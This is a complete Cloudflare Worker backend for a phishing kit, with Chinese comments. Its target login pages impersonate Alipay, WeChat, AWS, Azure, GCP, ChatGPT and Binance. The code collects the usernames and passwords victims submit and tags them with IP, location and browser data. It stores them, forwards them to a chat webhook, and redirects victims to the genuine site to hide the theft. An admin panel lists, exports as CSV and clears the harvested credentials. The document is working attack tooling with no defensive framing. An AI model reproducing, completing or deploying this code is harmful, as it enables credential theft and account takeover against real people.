export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // 静态资源服务
    if (url.pathname.startsWith('/site/')) {
      return await serveStatic(request, env);
    }
    
    // 收集凭证
    if (url.pathname === '/collect' && request.method === 'POST') {
      return await collectCredentials(request, env);
    }
    
    // 管理面板
    if (url.pathname === '/admin' || url.pathname.startsWith('/admin/')) {
      return await adminPanel(request, env);
    }
    
    // 健康检查
    if (url.pathname === '/health') {
      return new Response(JSON.stringify({ status: 'ok', timestamp: Date.now() }), {
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // 默认重定向到第一个钓鱼页面
    return Response.redirect('/site/alipay/', 302);
  }
};

async function collectCredentials(request, env) {
  try {
    const contentType = request.headers.get('Content-Type') || '';
    let payload = {};
    
    if (contentType.includes('application/json')) {
      payload = await request.json();
    } else if (contentType.includes('application/x-www-form-urlencoded')) {
      const formData = await request.formData();
      payload = Object.fromEntries(formData);
    } else if (contentType.includes('multipart/form-data')) {
      const formData = await request.formData();
      payload = Object.fromEntries(formData);
    }
    
    // 补充元数据
    payload.ip = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown';
    payload.ua = request.headers.get('User-Agent') || 'unknown';
    payload.referer = request.headers.get('Referer') || 'direct';
    payload.ts = Date.now();
    payload.country = request.headers.get('CF-IPCountry') || 'XX';
    payload.city = request.headers.get('CF-IPCity') || 'Unknown';
    payload.ray = request.headers.get('CF-Ray') || 'unknown';
    
    // 生成唯一ID
    payload.id = `${payload.ts}-${Math.random().toString(36).slice(2, 8)}`;
    
    // 存入 D1 数据库
    if (env.DB) {
      await env.DB.prepare(
        `INSERT INTO credentials (id, target, username, password, ip, ua, referer, country, city, ray, ts, raw)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
      ).bind(
        payload.id,
        payload.target || 'unknown',
        payload.username || '',
        payload.password || '',
        payload.ip,
        payload.ua,
        payload.referer,
        payload.country,
        payload.city,
        payload.ray,
        payload.ts,
        JSON.stringify(payload)
      ).run();
    }
    
    // 存入 KV 备用
    if (env.KV) {
      await env.KV.put(`cred:${payload.id}`, JSON.stringify(payload), { expirationTtl: 604800 }); // 7天
    }
    
    // 推送到钉钉/企微/飞书 Webhook
    if (env.WEBHOOK_URL) {
      await fetch(env.WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msgtype: 'text', text: { content: formatTextMessage(payload) } })
      }).catch(() => {});
    }
    
    // 记录日志
    console.log(`[CRED] ${payload.target} | ${payload.username}:${payload.password} | ${payload.ip} | ${payload.country}`);
    
    // 重定向到真实登录页
    const realUrls = {
      alipay: 'https://www.alipay.com/',
      wechat: 'https://wx.qq.com/',
      aws: 'https://signin.aws.amazon.com/',
      azure: 'https://portal.azure.com/',
      gcp: 'https://console.cloud.google.com/',
      chatgpt: 'https://chat.openai.com/',
      binance: 'https://www.binance.com/'
    };
    
    const target = payload.target || 'alipay';
    const redirectUrl = realUrls[target] || 'https://www.google.com/';
    
    return Response.redirect(redirectUrl, 302);
    
  } catch (err) {
    console.error('Collect error:', err);
    return Response.redirect('https://www.google.com/', 302);
  }
}

function formatTextMessage(payload) {
  return `[${payload.target.toUpperCase()}] ${payload.username}:${payload.password} | ${payload.ip} | ${new Date(payload.ts).toLocaleString()}`;
}

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

async function serveStatic(request, env) {
  // 简单的静态文件服务，实际部署建议用 Cloudflare Pages
  const url = new URL(request.url);
  const path = url.pathname.replace('/site/', '');
  
  // 这里只是示例，实际应该用 Pages 托管静态资源
  return new Response('Static files should be served via Cloudflare Pages', { status: 404 });
}

async function adminPanel(request, env) {
  const url = new URL(request.url);
  const authKey = url.searchParams.get('key') || request.headers.get('X-Admin-Key');
  
  if (authKey !== env.ADMIN_KEY) {
    return new Response('Unauthorized', { status: 401, headers: { 'WWW-Authenticate': 'Bearer' } });
  }
  
  if (url.pathname === '/admin/stats') {
    if (!env.DB) return new Response('DB not configured', { status: 500 });
    const stats = await env.DB.prepare(
      `SELECT target, COUNT(*) as count FROM credentials GROUP BY target`
    ).all();
    return Response.json(stats);
  }
  
  if (url.pathname === '/admin/list') {
    if (!env.DB) return new Response('DB not configured', { status: 500 });
    const limit = parseInt(url.searchParams.get('limit')) || 50;
    const offset = parseInt(url.searchParams.get('offset')) || 0;
    const target = url.searchParams.get('target');
    
    let query = `SELECT * FROM credentials ORDER BY ts DESC LIMIT ? OFFSET ?`;
    let params = [limit, offset];
    
    if (target) {
      query = `SELECT * FROM credentials WHERE target = ? ORDER BY ts DESC LIMIT ? OFFSET ?`;
      params = [target, limit, offset];
    }
    
    const results = await env.DB.prepare(query).bind(...params).all();
    return Response.json(results);
  }
  
  if (url.pathname === '/admin/export') {
    if (!env.DB) return new Response('DB not configured', { status: 500 });
    const results = await env.DB.prepare(
      `SELECT target, username, password, ip, country, city, ts FROM credentials ORDER BY ts DESC`
    ).all();
    
    // 生成 CSV
    let csv = 'target,username,password,ip,country,city,timestamp\n';
    for (const row of results.results) {
      csv += `${row.target},"${row.username}","${row.password}",${row.ip},${row.country},${row.city},${new Date(row.ts).toISOString()}\n`;
    }
    
    return new Response(csv, {
      headers: {
        'Content-Type': 'text/csv',
        'Content-Disposition': `attachment; filename="credentials_${Date.now()}.csv"`
      }
    });
  }
  
  if (url.pathname === '/admin/clear') {
    if (!env.DB) return new Response('DB not configured', { status: 500 });
    await env.DB.prepare(`DELETE FROM credentials`).run();
    return Response.json({ success: true, message: 'Cleared' });
  }
  
  // 管理面板 HTML
  return new Response(`
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; padding: 20px; }
    .container { max-width: 1200px; margin: 0 auto; }
    .card { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 20px; margin-bottom: 20px; }
    h1 { color: #333; margin-bottom: 20px; }
    h2 { color: #666; font-weight: 500; margin-bottom: 16px; }
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 20px; }
    .stat { background: #f8f9fa; padding: 16px; border-radius: 6px; text-align: center; }
    .stat-value { font-size: 28px; font-weight: 600; color: #1677ff; }
    .stat-label { font-size: 12px; color: #999; margin-top: 4px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; font-size: 13px; }
    th { background: #fafafa; font-weight: 600; color: #666; }
    tr:hover { background: #fafafa; }
    .target-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 500; }
    .target-alipay { background: #e6f4ff; color: #1677ff; }
    .target-wechat { background: #e6ffed; color: #07c160; }
    .target-aws { background: #fff4e6; color: #fa8c16; }
    .target-azure { background: #e6f4ff; color: #1677ff; }
    .target-gcp { background: #e6f4ff; color: #1677ff; }
    .target-chatgpt { background: #e6fffb; color: #10a37f; }
    .target-binance { background: #fffbe6; color: #f0b90b; }
    .btn { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; margin-right: 8px; }
    .btn-primary { background: #1677ff; color: white; }
    .btn-danger { background: #ff4d4f; color: white; }
    .search-box { display: flex; gap: 8px; margin-bottom: 16px; }
    .search-box input { flex: 1; padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🎣 钓鱼套件管理面板</h1>
    
    <div class="card">
      <h2>统计概览</h2>
      <div class="stats" id="stats"></div>
    </div>
    
    <div class="card">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
        <h2>凭证列表</h2>
        <div>
          <button class="btn btn-primary" onclick="exportCsv()">导出 CSV</button>
          <button class="btn btn-danger" onclick="clearAll()">清空所有</button>
        </div>
      </div>
      <div class="search-box">
        <input type="text" id="targetFilter" placeholder="按目标筛选 (alipay/wechat/aws/azure/gcp/chatgpt/binance)" onkeypress="if(event.key==='Enter')loadList()">
        <button class="btn btn-primary" onclick="loadList()">筛选</button>
        <button class="btn" onclick="loadList()">重置</button>
      </div>
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>目标</th>
            <th>账号</th>
            <th>密码</th>
            <th>IP / 地区</th>
            <th>时间</th>
          </tr>
        </thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
  </div>
  
  <script>
    async function loadStats() {
      try {
        const res = await fetch('/admin/stats?key=' + getKey());
        const data = await res.json();
        const statsEl = document.getElementById('stats');
        let total = 0;
        const targetNames = { alipay: '支付宝', wechat: '微信', aws: 'AWS', azure: 'Azure', gcp: 'GCP', chatgpt: 'ChatGPT', binance: 'Binance' };
        statsEl.innerHTML = data.results.map(r => {
          total += r.count;
          return \`<div class="stat"><div class="stat-value">\${r.count}</div><div class="stat-label">\${targetNames[r.target] || r.target}</div></div>\`;
        }).join('') + \`<div class="stat"><div class="stat-value">\${total}</div><div class="stat-label">总计</div></div>\`;
      } catch (e) { console.error(e); }
    }
    
    async function loadList() {
      const target = document.getElementById('targetFilter').value || null;
      try {
        let url = '/admin/list?key=' + getKey() + '&limit=100';
        if (target) url += '&target=' + target;
        const res = await fetch(url);
        const data = await res.json();
        const tbody = document.getElementById('tbody');
        tbody.innerHTML = data.results.map(r => \`
          <tr>
            <td><code>\${r.id}</code></td>
            <td><span class="target-badge target-\${r.target}">\${r.target}</span></td>
            <td><code>\${escapeHtml(r.username)}</code></td>
            <td><code>\${escapeHtml(r.password)}</code></td>
            <td>\${r.ip} / \${r.country}, \${r.city}</td>
            <td>\${new Date(r.ts).toLocaleString()}</td>
          </tr>
        \`).join('');
      } catch (e) { console.error(e); }
    }
    
    async function exportCsv() {
      window.open('/admin/export?key=' + getKey(), '_blank');
    }
    
    async function clearAll() {
      if (!confirm('确定清空所有凭证？')) return;
      try {
        await fetch('/admin/clear?key=' + getKey(), { method: 'POST' });
        loadStats();
        loadList();
      } catch (e) { console.error(e); }
    }
    
    function getKey() {
      return new URLSearchParams(window.location.search).get('key') || localStorage.getItem('adminKey') || '';
    }
    
    function escapeHtml(text) {
      return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }
    
    // 初始化
    const urlKey = new URLSearchParams(window.location.search).get('key');
    if (urlKey) localStorage.setItem('adminKey', urlKey);
    loadStats();
    loadList();
    setInterval(() => { loadStats(); loadList(); }, 30000);
  </script>
</body>
</html>
  `, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}